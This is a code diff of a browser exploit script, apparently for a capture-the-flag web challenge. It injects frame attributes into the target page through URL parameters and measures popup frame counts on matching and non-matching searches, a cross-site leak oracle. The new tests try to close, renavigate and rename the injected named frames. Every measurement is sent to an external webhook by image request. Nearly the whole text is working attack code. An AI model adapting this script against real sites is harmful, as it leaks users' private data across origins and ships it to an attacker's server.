@@ -10,136 +10,182 @@ function ping(m) { new Image().src = WH + '?' + encodeURIComponent(m); }
 function log(m) { document.getElementById('log').textContent += m + '\n'; }
 function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }
 
-// Track popup.length every intervalMs for durationMs
-function trackPopup(url, durationMs, intervalMs, features) {
-  return new Promise(function(resolve) {
-    var w;
-    try { w = window.open(url, '', features || ''); } catch(e) {
-      resolve({ history: [-1] }); return;
-    }
-    if (!w) { resolve({ history: [-2] }); return; }
-    var history = [];
-    var start = performance.now();
-    var iv = setInterval(function() {
-      var len = -1;
-      try { len = w.length; } catch(e) {}
-      history.push(len);
-      if (performance.now() - start >= durationMs) {
-        clearInterval(iv);
-        w.close();
-        resolve({ history: history });
-      }
-    }, intervalMs);
-  });
-}
-
 async function run() {
-  ping('v12_start');
+  ping('v13_start');
 
-  // === T1: loading=lazy MATCH - normal popup ===
-  log('T1: lazy match');
-  var t1 = await trackPopup(CHALL + '/?loading=x&referrerPolicy=lazy', 3000, 100);
-  ping('t1=' + t1.history.join(','));
-  await sleep(300);
-
-  // === T2: loading=lazy NOMATCH - normal popup ===
-  log('T2: lazy nomatch');
-  var t2 = await trackPopup(CHALL + '/?loading=x&referrerPolicy=lazy&search=zzzzzzz', 3000, 100);
-  ping('t2=' + t2.history.join(','));
-  await sleep(300);
-
-  // === T3: loading=lazy MATCH - small popup ===
-  log('T3: lazy small match');
-  var t3 = await trackPopup(CHALL + '/?loading=x&referrerPolicy=lazy', 3000, 100, 'width=50,height=50');
-  ping('t3=' + t3.history.join(','));
-  await sleep(300);
-
-  // === T4: loading=lazy NOMATCH - small popup ===
-  log('T4: lazy small nomatch');
-  var t4 = await trackPopup(CHALL + '/?loading=x&referrerPolicy=lazy&search=zzzzzzz', 3000, 100, 'width=50,height=50');
-  ping('t4=' + t4.history.join(','));
-  await sleep(300);
-
-  // === T5: Cross-origin child frame access test ===
-  log('T5: child frame access');
-  var w5 = window.open(CHALL + '/?referrerPolicy=no-referrer');
+  // === T1: Can we close() named frames to remove them? ===
+  log('T1: close named frames');
+  var w1 = window.open(CHALL + '/?name=x&referrerPolicy=adf');
   await sleep(2000);
-  var t5 = {};
-  try { t5.len = w5.length; } catch(e) { t5.len = 'E'; }
-  // Try accessing child frames
-  try { t5.f0len = w5[0].length; } catch(e) { t5.f0len = 'E:' + e.message.substring(0, 40); }
-  try { t5.f0closed = w5[0].closed; } catch(e) { t5.f0closed = 'E'; }
-  // Try to see if we can distinguish frame types by accessing properties
-  try { t5.f0name = w5[0].name; } catch(e) { t5.f0name = 'E'; }
-  try { t5.f0loc = '' + w5[0].location; } catch(e) { t5.f0loc = 'E'; }
-  w5.close();
-  ping('t5=' + JSON.stringify(t5));
-  await sleep(300);
+  var t1_before = -1;
+  try { t1_before = w1.length; } catch(e) { t1_before = 'E'; }
 
-  // === T6: Named frame test (inject name on ad iframes) ===
-  log('T6: named frames');
-  var w6 = window.open(CHALL + '/?name=x&referrerPolicy=adf');
-  await sleep(2000);
-  var t6 = {};
-  try { t6.len = w6.length; } catch(e) { t6.len = 'E'; }
-  // Try accessing named frame
-  try { var ref = w6['adf']; t6.named = ref ? 'yes' : 'no'; } catch(e) { t6.named = 'E:' + e.message.substring(0, 30); }
-  // Try accessing by numeric index and comparing
-  try { t6.f0eq = (w6[0] === w6['adf']) ? 'yes' : 'no'; } catch(e) { t6.f0eq = 'E'; }
-  w6.close();
-  ping('t6=' + JSON.stringify(t6));
-  await sleep(300);
-
-  // === T7: Named frame with match - can we find unnamed (note) frames? ===
-  log('T7: named + match');
-  var w7 = window.open(CHALL + '/?name=x&referrerPolicy=adf');
-  await sleep(2000);
-  var t7 = {};
-  try { t7.len = w7.length; } catch(e) { t7.len = 'E'; }
-  // Check each frame: is it the named one?
-  var frameInfo = [];
-  for (var i = 0; i < 12; i++) {
+  // Try closing the named frame
+  var closeResults = [];
+  for (var i = 0; i < 15; i++) {
     try {
-      var f = w7[i];
-      if (!f) { frameInfo.push('null'); continue; }
-      var isNamed = false;
-      try { isNamed = (f === w7['adf']); } catch(e2) {}
-      var subLen = -1;
-      try { subLen = f.length; } catch(e2) {}
-      frameInfo.push(i + ':' + (isNamed ? 'N' : 'U') + ':' + subLen);
+      var ref = w1['adf'];
+      if (!ref) { closeResults.push('noref'); break; }
+      ref.close();
+      await sleep(50);
+      var len = -1;
+      try { len = w1.length; } catch(e) { len = 'E'; }
+      closeResults.push(len);
     } catch(e) {
-      frameInfo.push(i + ':E');
+      closeResults.push('err:' + e.message.substring(0, 20));
+      break;
     }
   }
-  w7.close();
-  ping('t7=' + t7.len + '_' + frameInfo.join(','));
+  w1.close();
+  ping('t1=' + t1_before + '_' + closeResults.join(','));
   await sleep(300);
 
-  // === T8: srcdoc injection match ===
-  log('T8: srcdoc match');
-  var t8 = await trackPopup(CHALL + '/?srcdoc=x&referrerPolicy=hello', 3000, 100);
-  ping('t8=' + t8.history.join(','));
+  // === T2: Same but for NOMATCH ===
+  log('T2: close named nomatch');
+  var w2 = window.open(CHALL + '/?name=x&referrerPolicy=adf&search=zzzzzzz');
+  await sleep(2000);
+  var t2_before = -1;
+  try { t2_before = w2.length; } catch(e) { t2_before = 'E'; }
+
+  var closeResults2 = [];
+  for (var i = 0; i < 15; i++) {
+    try {
+      var ref = w2['adf'];
+      if (!ref) { closeResults2.push('noref'); break; }
+      ref.close();
+      await sleep(50);
+      var len = -1;
+      try { len = w2.length; } catch(e) { len = 'E'; }
+      closeResults2.push(len);
+    } catch(e) {
+      closeResults2.push('err:' + e.message.substring(0, 20));
+      break;
+    }
+  }
+  w2.close();
+  ping('t2=' + t2_before + '_' + closeResults2.join(','));
   await sleep(300);
 
-  // === T9: srcdoc injection nomatch ===
-  log('T9: srcdoc nomatch');
-  var t9 = await trackPopup(CHALL + '/?srcdoc=x&referrerPolicy=hello&search=zzzzzzz', 3000, 100);
-  ping('t9=' + t9.history.join(','));
+  // === T3: Navigate named frame to about:blank, check if name persists ===
+  log('T3: navigate named frame');
+  var w3 = window.open(CHALL + '/?name=x&referrerPolicy=adf');
+  await sleep(2000);
+  var t3 = {};
+  try { t3.len = w3.length; } catch(e) { t3.len = 'E'; }
+  try {
+    var ref3 = w3['adf'];
+    t3.hasRef = ref3 ? 'yes' : 'no';
+    // Navigate to about:blank
+    ref3.location = 'about:blank';
+    await sleep(200);
+    // Check if popup['adf'] still exists
+    var ref3b = w3['adf'];
+    t3.afterNav = ref3b ? 'yes' : 'no';
+    // Check length
+    try { t3.lenAfter = w3.length; } catch(e) { t3.lenAfter = 'E'; }
+    // Check if the navigated frame's length changed
+    try { t3.subLen = ref3b.length; } catch(e) { t3.subLen = 'E'; }
+  } catch(e) {
+    t3.err = e.message.substring(0, 40);
+  }
+  w3.close();
+  ping('t3=' + JSON.stringify(t3));
   await sleep(300);
 
-  // === T10: loading=lazy + id=hash-ad-frame combo (use style for display:none + lazy) ===
-  // We can only inject one attr, so test style with visibility:hidden
-  log('T10: style hidden match');
-  var t10 = await trackPopup(CHALL + '/?style=x&referrerPolicy=display:none', 3000, 100);
-  ping('t10=' + t10.history.join(','));
+  // === T4: Use window.open to target named frame ===
+  log('T4: window.open targeting named frame');
+  var w4 = window.open(CHALL + '/?name=x&referrerPolicy=adf');
+  await sleep(2000);
+  var t4 = {};
+  try { t4.len = w4.length; } catch(e) { t4.len = 'E'; }
+  // Use window.open to navigate the named frame
+  try {
+    var opened = window.open('about:blank', 'adf');
+    t4.opened = opened ? 'yes' : 'no';
+    await sleep(200);
+    // Check if it's same-origin now (about:blank inherits opener origin)
+    try { t4.openedLen = opened.length; } catch(e) { t4.openedLen = 'E'; }
+    try { t4.openedName = opened.name; } catch(e) { t4.openedName = 'E'; }
+    try { t4.openedDoc = opened.document.title; } catch(e) { t4.openedDoc = 'E'; }
+    // Check if we can write to it
+    try {
+      opened.document.write('<h1>test</h1>');
+      t4.wrote = 'yes';
+    } catch(e) { t4.wrote = 'E:' + e.message.substring(0, 30); }
+    // Can we change its name?
+    try {
+      opened.name = '';
+      t4.nameCleared = 'yes';
+    } catch(e) { t4.nameCleared = 'E'; }
+    await sleep(100);
+    // After clearing name, does popup['adf'] point to next frame?
+    try {
+      var next = w4['adf'];
+      t4.nextRef = next ? 'yes' : 'no';
+    } catch(e) { t4.nextRef = 'E'; }
+    try { t4.lenAfter = w4.length; } catch(e) { t4.lenAfter = 'E'; }
+  } catch(e) {
+    t4.err = e.message.substring(0, 40);
+  }
+  w4.close();
+  ping('t4=' + JSON.stringify(t4));
   await sleep(300);
 
-  // === T11: style hidden nomatch ===
-  log('T11: style hidden nomatch');
-  var t11 = await trackPopup(CHALL + '/?style=x&referrerPolicy=display:none&search=zzzzzzz', 3000, 100);
-  ping('t11=' + t11.history.join(','));
+  // === T5: Repeat T4 approach for MATCH - iteratively clear names ===
+  log('T5: iterative name clearing - match');
+  var w5 = window.open(CHALL + '/?name=x&referrerPolicy=adf');
+  await sleep(2000);
+  var t5_before = -1;
+  try { t5_before = w5.length; } catch(e) { t5_before = 'E'; }
 
-  ping('v12_done');
+  var cleared = 0;
+  for (var i = 0; i < 15; i++) {
+    try {
+      var ref5 = w5['adf'];
+      if (!ref5) break;
+      // Navigate to about:blank via window.open
+      var o5 = window.open('about:blank', 'adf');
+      await sleep(100);
+      // Try to clear name
+      try { o5.name = ''; } catch(e) {}
+      cleared++;
+    } catch(e) { break; }
+  }
+  var t5_after = -1;
+  try { t5_after = w5.length; } catch(e) { t5_after = 'E'; }
+  // Check if unnamed frames remain
+  var t5_hasAdf = 'no';
+  try { if (w5['adf']) t5_hasAdf = 'yes'; } catch(e) { t5_hasAdf = 'E'; }
+  w5.close();
+  ping('t5=before:' + t5_before + '_cleared:' + cleared + '_after:' + t5_after + '_hasAdf:' + t5_hasAdf);
+  await sleep(300);
+
+  // === T6: Same for NOMATCH ===
+  log('T6: iterative name clearing - nomatch');
+  var w6 = window.open(CHALL + '/?name=x&referrerPolicy=adf&search=zzzzzzz');
+  await sleep(2000);
+  var t6_before = -1;
+  try { t6_before = w6.length; } catch(e) { t6_before = 'E'; }
+
+  var cleared6 = 0;
+  for (var i = 0; i < 15; i++) {
+    try {
+      var ref6 = w6['adf'];
+      if (!ref6) break;
+      var o6 = window.open('about:blank', 'adf');
+      await sleep(100);
+      try { o6.name = ''; } catch(e) {}
+      cleared6++;
+    } catch(e) { break; }
+  }
+  var t6_after = -1;
+  try { t6_after = w6.length; } catch(e) { t6_after = 'E'; }
+  var t6_hasAdf = 'no';
+  try { if (w6['adf']) t6_hasAdf = 'yes'; } catch(e) { t6_hasAdf = 'E'; }
+  w6.close();
+  ping('t6=before:' + t6_before + '_cleared:' + cleared6 + '_after:' + t6_after + '_hasAdf:' + t6_hasAdf);
+
+  ping('v13_done');
   log('Done!');
 }
 run();
